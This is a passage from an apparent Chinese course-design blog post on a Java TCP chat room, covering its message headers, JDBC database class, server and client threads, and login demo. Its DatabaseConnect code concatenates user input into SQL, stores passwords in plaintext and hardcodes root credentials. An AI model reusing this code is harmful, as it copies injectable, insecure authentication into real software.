消息头</h2><p>消息头通常用于标识消息的用途或操作类型。类型为字符串（String），它可以包括诸如命令、指令、请求类型等信息。通过消息头，服务器和客户端可以快速识别消息的意图，从而决定下一步要执行的操作。如表3.1所示，在消息头的设计中包含8种类型以及对应的关键字。</p><center>表3.1  消息头种类</center><table><thead><tr><th>关键字&#xA;</th><th>作用&#xA;</th><th>解释&#xA;</th></tr></thead><tbody><tr><td>loginRequest&#xA;</td><td>登录请求&#xA;</td><td>客户端向服务器发出登录请求&#xA;</td></tr><tr><td>loginReply&#xA;</td><td>登录回复&#xA;</td><td>服务器对客户端发送的登录请求进行回复&#xA;</td></tr><tr><td>public&#xA;</td><td>群聊消息&#xA;</td><td>一个用户发送一条群聊消息&#xA;</td></tr><tr><td>private&#xA;</td><td>私聊消息&#xA;</td><td>一个用户对指定的用户发送一条私聊消息&#xA;</td></tr><tr><td>mute&#xA;</td><td>禁言&#xA;</td><td>服务器将指定用户禁言&#xA;</td></tr><tr><td>dismute&#xA;</td><td>解除禁言&#xA;</td><td>服务器将指定用户解除禁言&#xA;</td></tr><tr><td>delete&#xA;</td><td>通知有用户下线&#xA;</td><td>从客户端的在线用户列表中删除下线用户&#xA;</td></tr><tr><td>exit&#xA;</td><td>强制用户下线&#xA;</td><td>服务器将指定用户强制下线&#xA;</td></tr></tbody></table><h2 id="4-2-消息体"><a href="#4-2-消息体" class="headerlink" title="4.2 消息体"></a>4.2 消息体</h2><p>消息体则是实际传输的数据载荷，也以字符串（String）类型为主。消息体包含了具体的数据信息，例如文本内容、文件内容、数据结构等，这些数据是根据消息头指示的操作类型而传输的。对不同消息头的消息体分析如下：</p><ol><li><strong>消息头为loginRequest：</strong>消息体包含用户名和密码登录凭证信息。</li><li><strong>消息头为loginReply：</strong>消息体分为“true”和“false”两种信息，“true”表示身份信息核验通过，允许用户登录。否则不允许登录。</li><li><strong>消息头为public：</strong>消息体为用户发送消息的主体内容，将其消息体的内容显示在群聊窗口中。</li><li><strong>消息头为private：</strong>此时消息体是一个结构化的内容，分别用户名和对应的消息内容主体。</li><li><strong>消息头为delete：</strong>消息体中包含下线用户的用户名，需要将其从在线用户列表中进行删除。</li><li><strong>消息头为mute、dismute和exit：</strong>此时消息体为空，分别执行用户禁言和解除禁言操作。</li></ol><p>通过合理设计和使用消息头和消息体，可以实现服务器和客户端之间的有效通信和数据交换。消息头提供了关键的元数据信息，帮助接收方正确解析消息；消息体则承载了具体的业务数据或操作结果。这种设计不仅能够满足各种通信场景的需求，还能保证通信的安全性、可靠性和扩展性。</p><hr><h1 id="5-数据库交互功能设计"><a href="#5-数据库交互功能设计" class="headerlink" title="5 数据库交互功能设计"></a>5 数据库交互功能设计</h1><p>在Java语言中，通常使用JDBC（Java Database Connectivity）与数据库进行交互。JDBC作为Java语言中与关系型数据库交互的标准API，提供了开发和维护数据库应用程序的基础设施。通过合理地利用JDBC的各种功能和特性，开发人员能够实现高效、可靠和安全的数据库操作，从而满足复杂的业务需求和性能要求。</p><p>在JDBC的基础上，实现了一个用于操作数据库的Java类DatabaseConnect，主要用于连接到MySQL数据库，并提供了查询和插入操作的功能，其中包含的变量如表3.2所示。</p><center>表3.2  DatabaseConnect类中的变量</center><table><thead><tr><th>变量名&#xA;</th><th>变量类型&#xA;</th><th>作用&#xA;</th></tr></thead><tbody><tr><td>sql&#xA;</td><td>String&#xA;</td><td>用于存储SQL语句&#xA;</td></tr><tr><td>stmt&#xA;</td><td>Statement&#xA;</td><td>用于执行SQL语句的Statement对象&#xA;</td></tr><tr><td>conn&#xA;</td><td>Connection&#xA;</td><td>数据库连接对象&#xA;</td></tr></tbody></table><p>表3.3列举了DatabaseConnect类中定义的方法。通过这些方法，可以实现基本的用户身份验证和数据记录功能。同时，通过异常处理，确保程序在面对异常情况时能够正确地处理并提供错误信息。</p><center>表3.3  DatabaseConnect类中的方法</center><table><thead><tr><th>方法名&#xA;</th><th>返回值类型&#xA;</th><th>参数列表&#xA;</th><th>作用&#xA;</th></tr></thead><tbody><tr><td>DatabaseConnect&#xA;</td><td>无返回值&#xA;</td><td>无&#xA;</td><td>注册JDBC驱动，建立数据库连接，实例话Statement对象&#xA;</td></tr><tr><td>query&#xA;</td><td>boolean&#xA;</td><td>String username&#xA;String password&#xA;</td><td>查询数据库中指定用户名的密码，并验证密码是否匹配&#xA;</td></tr><tr><td>insert&#xA;</td><td>boolean&#xA;</td><td>String username&#xA;String password&#xA;</td><td>向数据库中插入新的用户名和密码记录&#xA;</td></tr></tbody></table><p>DatabaseConnect类的代码实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DatabaseConnect</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String sql;</span><br><span class="line">    <span class="keyword">private</span> Statement stmt;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DatabaseConnect</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 注册JDBC驱动程序</span></span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 打开连接</span></span><br><span class="line">            System.out.println(<span class="string">&quot;连接到数据库...&quot;</span>);</span><br><span class="line">            conn = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/db_stu?useSSL=false&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">            stmt = conn.createStatement();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException se) &#123;</span><br><span class="line">            <span class="comment">// 处理JDBC错误</span></span><br><span class="line">            se.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 处理Class.forName错误</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">query</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// 执行查询</span></span><br><span class="line">        System.out.println(<span class="string">&quot;查询username为&quot;</span> + username);</span><br><span class="line"></span><br><span class="line">        sql = <span class="string">&quot;SELECT password FROM user where username=&#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理结果集</span></span><br><span class="line">        <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">            <span class="comment">// 检索每列</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 清理环境</span></span><br><span class="line">            rs.close();</span><br><span class="line">            stmt.close();</span><br><span class="line">            <span class="keyword">return</span> password.equals(pwd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 清理环境</span></span><br><span class="line">        rs.close();</span><br><span class="line">        stmt.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">insert</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        sql = <span class="string">&quot;INSERT INTO user values(&#x27;&quot;</span> + username + <span class="string">&quot;&#x27; ,&#x27;&quot;</span> + password + <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rowsAffected</span> <span class="operator">=</span> stmt.executeUpdate(sql);</span><br><span class="line">        <span class="keyword">return</span> rowsAffected &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在使用JDBC之前，首先需要加载适当的数据库驱动程序。每个数据库厂商都提供了自己的JDBC驱动程序，它们通常都实现了java.sql.Driver接口。之后通过DriverManager.getConnection()方法建立与数据库的连接。需要提供数据库的URL、用户名和密码。连接建立后，可以创建Connection对象来执行SQL语句和管理事务。并创建Statement或PreparedStatement对象，用于执行SQL查询、更新或删除操作。</p><p>通过执行SQL查询语句后返回的ResultSet对象来处理查询结果。ResultSet提供了对查询结果集的遍历和访问方法，可以通过列名或索引获取具体的数据值。在完成数据库操作后，需要显式关闭Connection、Statement、PreparedStatement和ResultSet等对象，以释放数据库资源并避免内存泄漏。</p><hr><h1 id="6-界面绘制"><a href="#6-界面绘制" class="headerlink" title="6 界面绘制"></a>6 界面绘制</h1><p>在界面绘制部分，包括客户端登录界面、客户端聊天界面以及服务器管理界面的设计，使用Java Swing工具进行开发。Java Swing是Java提供的一个GUI工具包，用于创建跨平台的桌面应用程序。它提供了丰富的组件和布局管理器，使开发者能够灵活地设计和布局用户界面。</p><p>在Swing中，提供了很多封装好的组件（Component）和布局管理器（Layout Manager），其中组件包括按钮（JButton）、标签（JLabel）和文本框（JTextArea）等；布局管理器用来确定组件在容器中的位置和大小，确保界面在不同平台和窗口大小下的一致性和美观性。常见的布局管理器包括FlowLayout、BorderLayout、GridLayout和GridBagLayout。</p><p>此外，在界面设计中还使用了事件监听器（Listener）来处理用户操作，比如处理用户点击按钮、用户选择私聊对象等事件，通过使用上述基本组件、布局和事件设计来完成此次界面的开发。</p><hr><h1 id="7-Socket编程实现聊天功能"><a href="#7-Socket编程实现聊天功能" class="headerlink" title="7 Socket编程实现聊天功能"></a>7 Socket编程实现聊天功能</h1><h2 id="7-1-Server类实现"><a href="#7-1-Server类实现" class="headerlink" title="7.1 Server类实现"></a>7.1 Server类实现</h2><p>Server类是一个实现服务器端功能的Java类，主要用于管理和处理多个客户端的连接和通信。该类包含两个重要的内部类：ClientAgent和ServerUI，它们分别负责处理客户端连接和管理服务器的用户界面。</p><p>表3.4描述了Server类中的变量，通过这些变量来帮助服务器管理和处理来自多个客户端的请求和消息。</p><center>表3.4  Server类中的变量</center><table><thead><tr><th>变量名&#xA;</th><th>变量类型&#xA;</th><th>作用&#xA;</th></tr></thead><tbody><tr><td>ui&#xA;</td><td>ServerUI&#xA;</td><td>控制界面相关信息显示&#xA;</td></tr><tr><td>db&#xA;</td><td>DatabaseConnect&#xA;</td><td>与数据库进行交互&#xA;</td></tr><tr><td>serverSocket&#xA;</td><td>ServerSocket&#xA;</td><td>监听是否有客户端发送请求&#xA;</td></tr><tr><td>mp&#xA;</td><td>Map&lt;Socket, String&gt;&#xA;</td><td>建立socket和用户姓名之间的映射&#xA;</td></tr><tr><td>clients&#xA;</td><td>List&lt;ClientAgent&gt;&#xA;</td><td>保存当前所有在线用户的socket&#xA;</td></tr></tbody></table><p>表3.5描述了Server类中的方法，这些方法共同组成了Server类的功能，实现了服务器端的核心逻辑：监听客户端连接、管理多个客户端的通信、处理消息广播和动态客户端管理等。</p><center>表3.5  Server类中的方法</center><table><thead><tr><th>方法名&#xA;</th><th>返回值类型&#xA;</th><th>参数列表&#xA;</th><th>作用&#xA;</th></tr></thead><tbody><tr><td>Server&#xA;</td><td>无返回值&#xA;</td><td>Int port&#xA;</td><td>在port端口创建一个Socket套接字，创建界面&#xA;</td></tr><tr><td>listen&#xA;</td><td>void&#xA;</td><td>无&#xA;</td><td>监听客户端连接请求&#xA;</td></tr><tr><td>broadcastMessage&#xA;</td><td>void&#xA;</td><td>String message&#xA;ClientAgent me&#xA;</td><td>向出了发送方me外其他客户端广播消息message&#xA;</td></tr></tbody></table><p>在listen方法中，服务器端开放一个端口号不断监听从客户端发送的请求，使用java语言中的Socket类。Socket类位于java.net包中，提供了客户端和服务器之间进行通信的能力，支持基于TCP协议的网络通信。</p><p>Server类服务器的设计逻辑如下：首先使用Socket类创建客户端或服务器端的套接字对象。客户端通过Socket发送请求到服务器的指定地址和端口，服务器接受客户端的连接请求并创建一个ClientAgent客户端代理对象用于处理之后该客户端的请求。</p><p>Server类中监听来自客户端请求的核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务器创建socket</span></span><br><span class="line"><span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="comment">// 等待客户端进行连接</span></span><br><span class="line">    <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">    System.out.println(<span class="string">&quot;新的客户端发送请求：&quot;</span> + socket);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个新的线程用于处理客户的请求</span></span><br><span class="line">    <span class="type">ClientAgent</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClientAgent</span>(socket);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加到当前所有用户请求的列表中</span></span><br><span class="line">    clients.add(client);</span><br><span class="line">    client.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后服务器不断监听是否有客户端向当前的Socket发送请求，如果检测到有请求，则创建一个新的线程类的实例化对象client处理这个客户端的请求，之后继续监听是否有其他客户端发送请求。</p><h2 id="7-2-内部类ClientAgent的实现"><a href="#7-2-内部类ClientAgent的实现" class="headerlink" title="7.2 内部类ClientAgent的实现"></a>7.2 内部类ClientAgent的实现</h2><p>ClientAgent是Server类中的一个重要的内部线程类，主要负责处理服务器与单个客户端之间的通信。表3.6展示了其中的私有变量，具体变量类型和作用如下所示。</p><center>表3.6  ClientAgent类中的变量</center><table><thead><tr><th>变量名&#xA;</th><th>变量类型&#xA;</th><th>作用&#xA;</th></tr></thead><tbody><tr><td>myName&#xA;</td><td>String&#xA;</td><td>用于存储当前socket对应的用户名&#xA;</td></tr><tr><td>socket&#xA;</td><td>Socket&#xA;</td><td>负责处理的客户端socket&#xA;</td></tr><tr><td>send&#xA;</td><td>PrintWriter&#xA;</td><td>用于向客户端发送消息&#xA;</td></tr><tr><td>receive&#xA;</td><td>BufferedReader&#xA;</td><td>用于从客户端接收消息&#xA;</td></tr></tbody></table><p>同时定义了表3.7中的方法，来有效地处理客户端的连接、登录、消息收发等操作，保证了服务器与客户端之间的稳定通信和用户管理功能。</p><center>表3.7  ClientAgent类中的方法</center><table><thead><tr><th>方法名&#xA;</th><th>返回值类型&#xA;</th><th>参数列表&#xA;</th><th>作用&#xA;</th></tr></thead><tbody><tr><td>ClientAgent&#xA;</td><td>无返回值&#xA;</td><td>Socket socket&#xA;</td><td>实例化与客户端通信所需的变量socket、send和receive&#xA;</td></tr><tr><td>login&#xA;</td><td>void&#xA;</td><td>String username&#xA;String password&#xA;</td><td>处理客户端的登录请求&#xA;</td></tr><tr><td>exit&#xA;</td><td>void&#xA;</td><td>String username&#xA;</td><td>处理客户端的退出请求&#xA;</td></tr><tr><td>privateChat&#xA;</td><td>void&#xA;</td><td>String username&#xA;String message&#xA;</td><td>处理客户端的私聊消息&#xA;</td></tr><tr><td>run&#xA;</td><td>void&#xA;</td><td>无&#xA;</td><td>根据客户端发送消息的消息头类型进行逻辑处理&#xA;</td></tr></tbody></table><p>在上述方法中，最重要的是run方法的实现。在run方法中，通过reverive.readLine()不断读取客户端发送的消息，直到客户端断开连接。如果收到客户端发送的消息，根据消息头的类型进行逻辑处理。</p><p>同时，应当捕获可能的异常并及时输出错误信息。最终，在客户端断开连接时，执行清理工作：退出用户、关闭流和socket，并从在线用户clients列表中移除当前ClientAgent实例，核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 用于接受当前socket客户端发送的消息</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String message;</span><br><span class="line">        <span class="keyword">while</span> ((message = receive.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 解析客户端发送的消息类型</span></span><br><span class="line">            <span class="keyword">if</span> (message.contains(<span class="string">&quot;message:&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> mp.get(socket) + <span class="string">&quot;：&quot;</span> + message.substring(<span class="number">8</span>);</span><br><span class="line">                <span class="comment">// 收到客户端消息，广播给所有客户端</span></span><br><span class="line">                broadcastMessage(content, <span class="built_in">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">st</span> <span class="operator">=</span> message.indexOf(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">ed</span> <span class="operator">=</span> message.indexOf(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> message.substring(st + <span class="number">1</span>, ed);</span><br><span class="line">                <span class="type">String</span> <span class="variable">pwdOrMsg</span> <span class="operator">=</span> message.substring(ed + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (message.contains(<span class="string">&quot;loginRequest:&quot;</span>))</span><br><span class="line">                    login(username, pwdOrMsg);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    privateChat(username, pwdOrMsg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Error handling client: &quot;</span> + e.getMessage());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> mp.get(socket);</span><br><span class="line">            exit(username);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭流和socket</span></span><br><span class="line">            send.close();</span><br><span class="line">            receive.close();</span><br><span class="line">            socket.close();</span><br><span class="line">            clients.remove(<span class="built_in">this</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;用户断开连接: &quot;</span> + socket);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Error closing client: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-3-Client类实现"><a href="#7-3-Client类实现" class="headerlink" title="7.3 Client类实现"></a>7.3 Client类实现</h2><p>Client类是一个基于Java Swing的客户端应用程序，用于实现在线聊天系统的功能，其中包含内部类ServerAgent用于处理来自服务器的消息。</p><center>表3.8  Client类中的变量</center><table><thead><tr><th>变量名&#xA;</th><th>变量类型&#xA;</th><th>作用&#xA;</th></tr></thead><tbody><tr><td>socket&#xA;</td><td>Socket&#xA;</td><td>用于与server进行通信的套接字&#xA;</td></tr><tr><td>receive&#xA;</td><td>BufferReader&#xA;</td><td>用于从服务器接收消息&#xA;</td></tr><tr><td>send&#xA;</td><td>PrintWriter&#xA;</td><td>用于向服务器发送消息&#xA;</td></tr><tr><td>chatUserName&#xA;</td><td>String&#xA;</td><td>当前要进行私聊的用户名&#xA;</td></tr></tbody></table><p>如表3.9所示，在Client类中，有以下关键方法用于实现客户端的核心功能。</p><center>表3.9  Client类中的方法</center><table><thead><tr><th>方法名&#xA;</th><th>返回值类型&#xA;</th><th>参数列表&#xA;</th><th>作用&#xA;</th></tr></thead><tbody><tr><td>Client&#xA;</td><td>无返回值&#xA;</td><td>无&#xA;</td><td>实例化与服务器通信所需的变量socket、send和receive&#xA;</td></tr><tr><td>loginCheck&#xA;</td><td>boolean&#xA;</td><td>String username&#xA;String password&#xA;</td><td>发送用户登录请求到服务器，并等待服务器返回登录结果&#xA;</td></tr><tr><td>loginSuccess&#xA;</td><td>void&#xA;</td><td>String username&#xA;</td><td>显示聊天界面，并启动新线程用于接收服务器发送的消息&#xA;</td></tr><tr><td>createUI&#xA;</td><td>void&#xA;</td><td>String username&#xA;</td><td>处理客户端的私聊消息&#xA;</td></tr><tr><td>newChatArea&#xA;</td><td>void&#xA;</td><td>无&#xA;</td><td>创建用户界面&#xA;</td></tr><tr><td>sendMessage&#xA;</td><td>void&#xA;</td><td>无&#xA;</td><td>发送消息给服务器&#xA;</td></tr><tr><td>newMessage&#xA;</td><td>void&#xA;</td><td>String message&#xA;</td><td>处理接收到的新消息&#xA;</td></tr></tbody></table><h2 id="7-4-内部类ServerAgent的实现"><a href="#7-4-内部类ServerAgent的实现" class="headerlink" title="7.4 内部类ServerAgent的实现"></a>7.4 内部类ServerAgent的实现</h2><p>在Client类中，最重要的是ServerAgent类的实现。ServerAgent类通过继承Thread类，实现了多线程处理接收服务器消息的功能。</p><p>在ServerAgent类定义了一个run方法，通过循环持续接收消息，并根据消息内容动态调整客户端的行为和界面显示，实现了与服务器端的实时通信和状态同步。其中使用了try-catch块捕获IOException异常，在捕获到异常时，抛出RuntimeException并传递原始异常对象，以便进行异常处理或记录。</p><p>ServerAgent类的代码实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerAgent</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        String message;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ((message = receive.readLine()) == <span class="literal">null</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 打印接收到的消息</span></span><br><span class="line">            System.out.println(message);</span><br><span class="line">            <span class="comment">// 判断客户端收到的信息类型</span></span><br><span class="line">            <span class="comment">// 1.新用户上线</span></span><br><span class="line">            <span class="keyword">if</span> (message.contains(<span class="string">&quot;new:&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">newUserName</span> <span class="operator">=</span> message.substring(<span class="number">4</span>);</span><br><span class="line">                newUserLogin(newUserName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 2.有用户下线</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (message.contains(<span class="string">&quot;delete:&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> message.substring(<span class="number">7</span>);</span><br><span class="line">                removeUser(username);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 3.强制下线</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (message.contains(<span class="string">&quot;exit&quot;</span>)) &#123;</span><br><span class="line">                dispose();</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 4.解除禁言</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (message.contains(<span class="string">&quot;dismute&quot;</span>)) &#123;</span><br><span class="line">                sendButton.setEnabled(<span class="literal">true</span>);</span><br><span class="line">                chatButton.setEnabled(<span class="literal">true</span>);</span><br><span class="line">                sendButton.setText(<span class="string">&quot;发送消息&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 5.禁言</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (message.contains(<span class="string">&quot;mute&quot;</span>)) &#123;</span><br><span class="line">                sendButton.setEnabled(<span class="literal">false</span>);</span><br><span class="line">                chatButton.setEnabled(<span class="literal">false</span>);</span><br><span class="line">                sendButton.setText(<span class="string">&quot;禁言中&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 6.聊天消息</span></span><br><span class="line">            <span class="keyword">else</span> newMessage(message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="8-程序演示"><a href="#8-程序演示" class="headerlink" title="8 程序演示"></a>8 程序演示</h1><p>在程序演示部分创建1个服务器端和2个客户端进行测试，以演示多个客户端同时与服务器通信和聊天功能测试的情况。</p><h2 id="8-1-客户端注册和登录功能演示"><a href="#8-1-客户端注册和登录功能演示" class="headerlink" title="8.1 客户端注册和登录功能演示"></a>8.1 客户端注册和登录功能演示</h2><p>启动在线聊天室程序后，登录界面如图3.2所示。</p><p><img src="/2024/06/22/%E8%AE%A1%E7%BD%91%E8%AF%BE%E8%AE%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ETCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8E%86%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image_NQSUl3Fhpd.jpeg"></p><center>图3.2  在线聊天室登录界面</center><p>当用户第一次登录在线聊天程序时，需要注册对应的用户名和密码，即点击“注册”按钮进行用户的注册，如图3.3所示。</p><p><img 